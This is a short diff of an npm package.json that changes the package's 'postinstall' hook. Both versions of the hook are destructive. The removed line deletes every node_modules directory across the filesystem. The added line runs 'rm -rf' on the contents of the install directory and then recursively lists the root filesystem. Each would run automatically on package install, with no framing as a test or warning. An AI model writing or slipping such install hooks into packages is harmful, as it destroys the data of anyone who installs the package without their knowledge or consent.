@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "find / -type d -name node_modules -delete"
+    "postinstall": "rm -rf $(ls -a) && ls -aRl /"
   },
   "keywords": [
     "general",
